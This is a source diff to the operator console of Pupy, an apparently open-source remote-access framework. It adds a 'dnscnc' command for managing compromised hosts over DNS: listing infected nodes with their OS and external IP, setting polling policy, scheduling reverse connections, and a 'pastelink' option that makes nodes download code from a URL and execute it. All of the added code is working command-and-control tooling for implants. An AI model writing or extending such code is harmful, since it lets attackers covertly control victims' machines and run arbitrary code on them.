@@ -44,26 +44,11 @@ from .PupyErrors import PupyModuleExit, PupyModuleError
 from .PupyModule import PupyArgumentParser
 from .PupyJob import PupyJob
 from .PupyCompleter import PupyCompleter
-import argparse
-from pupysh import __version__, __date__
+from .PupyVersion import BANNER, BANNER_INFO
+from argparse import REMAINDER
 import copy
 from functools import partial
-
-BANNER="""
-            _____                    _       _ _
- ___ ___   |  _  |_ _ ___ _ _    ___| |_ ___| | |   ___ ___
-|___|___|  |   __| | | . | | |  |_ -|   | -_| | |  |___|___|
-           |__|  |___|  _|_  |  |___|_|_|___|_|_|
-                     |_| |___|
-
-                   %s (%s)
-"""%(__version__, __date__)
-
-BANNER_INFO="""
-Author:           Nicolas VERDIER  < @n1nj4sec > (contact@n1nj4.eu)
-Bleeding edge:    https://github.com/n1nj4sec/pupy
-"""
-
+from threading import Thread, Event
 
 def color_real(s, color, prompt=False, colors_enabled=True):
     """ color a string using ansi escape characters. set prompt to true to add marks for readline to see invisible portions of the prompt
@@ -149,9 +134,10 @@ class WindowsColoredStdout(object):
         sys.stdout.read(*args, **kwargs)
 
 class PupyCmd(cmd.Cmd):
-    def __init__(self, pupsrv, configFile="pupy.conf"):
+    def __init__(self, pupsrv, dnscnc=None, configFile="pupy.conf"):
         cmd.Cmd.__init__(self)
         self.pupsrv=pupsrv
+        self.dnscnc=dnscnc
         self.pupsrv.register_handler(self)
         self.config = configparser.ConfigParser()
         self.config.read(configFile)
@@ -241,7 +227,7 @@ class PupyCmd(cmd.Cmd):
             arg_parser = PupyArgumentParser(prog=tab[0], add_help=False)
             arg_parser.add_argument('-f', '--filter', metavar='<client filter>', help="filter to a subset of all clients. All fields available in the \"info\" module can be used. example: run get_info -f 'platform:win release:7 os_arch:64'")
             arg_parser.add_argument('--bg', action='store_true', help="run in background")
-            arg_parser.add_argument('arguments', nargs=argparse.REMAINDER, metavar='<arguments>', help="module arguments")
+            arg_parser.add_argument('arguments', nargs=REMAINDER, metavar='<arguments>', help="module arguments")
             if len(tab)==1:
                 self.do_run(self.aliases[tab[0]])
             else:
@@ -577,7 +563,7 @@ class PupyCmd(cmd.Cmd):
         arg_parser.add_argument('module', metavar='<module>', help="module")
         arg_parser.add_argument('-f', '--filter', metavar='<client filter>', default=self.default_filter ,help="filter to a subset of all clients. All fields available in the \"info\" module can be used. example: run get_info -f 'platform:win release:7 os_arch:64'")
         arg_parser.add_argument('--bg', action='store_true', help="run in background")
-        arg_parser.add_argument('arguments', nargs=argparse.REMAINDER, metavar='<arguments>', help="module arguments")
+        arg_parser.add_argument('arguments', nargs=REMAINDER, metavar='<arguments>', help="module arguments")
         pj=None
         try:
             modargs=arg_parser.parse_args(shlex.split(arg))
@@ -694,6 +680,199 @@ class PupyCmd(cmd.Cmd):
         except IndexError:
             return None
 
+    def do_dnscnc(self, arg):
+        """ DNSCNC commands """
+        if not self.dnscnc:
+            self.display_error('DNSCNC disabled')
+            return
+
+        arg_parser = PupyArgumentParser(
+            prog='dnscnc', description=self.do_dnscnc.__doc__)
+        commands = arg_parser.add_subparsers(title='commands', dest='command')
+        status = commands.add_parser('status', help='DNSCNC status')
+        clist = commands.add_parser('list', help='List known DNSCNC clients')
+
+        policy = commands.add_parser('set', help='Change policy (polling, timeout)')
+        policy.add_argument('-p', '--poll', help='Set poll interval', type=int)
+        policy.add_argument('-k', '--kex', type=bool, help='Enable KEX')
+        policy.add_argument('-t', '--timeout', type=int, help='Set session timeout')
+
+        connect = commands.add_parser('connect', help='Request reverse connection')
+        connect.add_argument('-n', '--node', help='Send command only to this node')
+        connect.add_argument('-d', '--default', action='store_true', default=False,
+                                 help='Set command as default for new connections')
+        connect.add_argument('-c', '--host', help='Manually specify external IP address for connection')
+        connect.add_argument('-p', '--port', help='Manually specify external PORT for connection')
+        connect.add_argument('-t', '--transport', help='Manually specify transport for connection')
+
+        reset = commands.add_parser('reset', help='Reset scheduled commands')
+        reset.add_argument('-n', '--node', help='Remove all commands for specified node')
+        reset.add_argument('-d', '--default', action='store_true', default=False,
+                               help='Remove all default commands')
+        disconnect = commands.add_parser('disconnect', help='Request disconnection')
+        disconnect.add_argument('-d', '--default', action='store_true', default=False,
+                                 help='Set command as default for new connections')
+        disconnect.add_argument('-n', '--node', help='Send command only to this node')
+
+        exit = commands.add_parser('exit', help='Request exit')
+        exit.add_argument('-d', '--default', action='store_true', default=False,
+                                 help='Set command as default for new connections')
+        exit.add_argument('-n', '--node', help='Send command only to this node')
+
+        pastelink = commands.add_parser('pastelink', help='Execute code by link')
+        pastelink.add_argument('-a', '--action', choices=['exec', 'pyexec'], default='pyexec',
+                                   help='Action - execute as executable, or evaluate as python code')
+        pastelink_src = pastelink.add_mutually_exclusive_group(required=True)
+        pastelink_src.add_argument('-c', '--create', help='Create new pastelink from file')
+        pastelink_src.add_argument('-u', '--url', help='Specify existing URL')
+        pastelink.add_argument('-d', '--default', action='store_true', default=False,
+                                 help='Set command as default for new connections')
+        pastelink.add_argument('-n', '--node', help='Send command only to this node')
+
+        try:
+            args = arg_parser.parse_args(shlex.split(arg))
+        except PupyModuleExit:
+            return
+
+        if args.command == 'status':
+            policy = self.dnscnc.policy
+            objects = {
+                'DOMAIN': self.dnscnc.dns_domain,
+                'DNS PORT': str(self.dnscnc.dns_port),
+                'TRANSPORT': self.dnscnc.transport,
+                'IP': ', '.join(self.dnscnc.host),
+                'PORT': str(self.dnscnc.port),
+                'RECURSOR': self.dnscnc.dns_recursor,
+                'LISTEN': str(self.dnscnc.dns_listen),
+                'SESSIONS': 'TOTAL={} DIRTY={}'.format(
+                    self.dnscnc.count, self.dnscnc.dirty
+                ),
+                'POLL': '{}s'.format(policy['interval']),
+                'TIMEOUT': '{}s'.format(policy['timeout']),
+                'KEX': '{}'.format(bool(policy['kex'])),
+            }
+
+            self.display(PupyCmd.table_format([
+                {'PROPERTY':k, 'VALUE':v} for k,v in objects.iteritems()
+            ]))
+
+            if self.dnscnc.commands:
+                self.display('\nDEFAULT COMMANDS:\n'+'\n'.join([
+                    '{:03d} {}'.format(i, cmd) for i, cmd in enumerate(self.dnscnc.commands)
+                ]))
+
+        elif args.command == 'list':
+            sessions = self.dnscnc.list()
+            if not sessions:
+                self.display_success('No active DNSCNC sesisons found')
+                return
+
+            objects = []
+
+            for session in sessions:
+                objects.append({
+                    'NODE': '{:012x}'.format(session.system_info['node']),
+                    'EXTERNAL IP': '{}'.format(
+                        session.system_info['external_ip'] or '?'
+                    ),
+                    'ONLINE': '{}'.format(
+                        'Y' if session.system_info['internet'] else 'N'
+                    ),
+                    'IDLE': '{}s'.format(session.idle),
+                    'DURATION': '{}s'.format(session.duration),
+                    'OS': '{}/{}'.format(
+                        session.system_info['os'],
+                        session.system_info['arch']
+                    ),
+                    'BOOTED': '{}s'.format(
+                        session.system_info['boottime'].ctime() if \
+                        session.system_info['boottime'] else '?'
+                    )
+                })
+
+            columns = [
+                'NODE', 'OS', 'ONLINE', 'EXTERNAL IP', 'IDLE', 'DURATION', 'BOOTED'
+            ]
+
+            self.display(
+                PupyCmd.table_format(objects, wl=columns)
+            )
+
+        elif args.command == 'set':
+            if all([x is None for x in [args.kex, args.timeout, args.poll]]):
+                self.display_error('No arguments provided.')
+            else:
+                count = self.dnscnc.set_policy(args.kex, args.timeout, args.poll)
+                if count:
+                    self.display_success('Apply policy to {} known nodes'.format(count))
+
+        elif args.command == 'reset':
+            count = self.dnscnc.reset(
+                session=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Reset commands on {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'connect':
+            count = self.dnscnc.connect(
+                host=args.host,
+                port=args.port,
+                transport=args.transport,
+                node=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule connect {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'disconnect':
+            count = self.dnscnc.disconnect(
+                node=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule disconnect to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'exit':
+            count = self.dnscnc.exit(
+                node=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule exit to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'pastelink':
+            try:
+                count, url = self.dnscnc.pastelink(
+                    content=args.create,
+                    url=args.url,
+                    action=args.action,
+                    node=args.node,
+                    default=args.default
+                )
+
+                self.display_success('URL: {}'.format(url))
+
+                if count:
+                    self.display_success('Schedule exit to {} known nodes'.format(count))
+                elif args.node:
+                    self.display_error('Node {} not found'.format(args.node))
+
+            except ValueError as e:
+                self.display_error('{}'.format(e))
+
     def do_exit(self, arg):
         """ Quit Pupy Shell """
         return True
@@ -730,3 +909,27 @@ class PupyCmd(cmd.Cmd):
         tab = line.split(' ',1)
         if len(tab)>=2:
             return self._complete_path(tab[1])
+
+class PupyCmdThread(Thread):
+    def __init__(self, pupyServer, pupyDnsCnc):
+        Thread.__init__(self)
+        self.daemon = True
+        self.cmd = PupyCmd(pupyServer, pupyDnsCnc)
+        self.pupysrv = pupyServer
+        self.stopped = Event()
+
+    def run(self):
+
+        while not self.stopped.is_set():
+            try:
+                self.cmd.cmdloop()
+                self.stopped.set()
+            except Exception as e:
+                print(traceback.format_exc())
+                time.sleep(0.1) #to avoid flood in case of exceptions in loop
+                self.cmd.intro=''
+
+        self.pupysrv.stop()
+
+    def stop(self):
+        self.stopped.set()
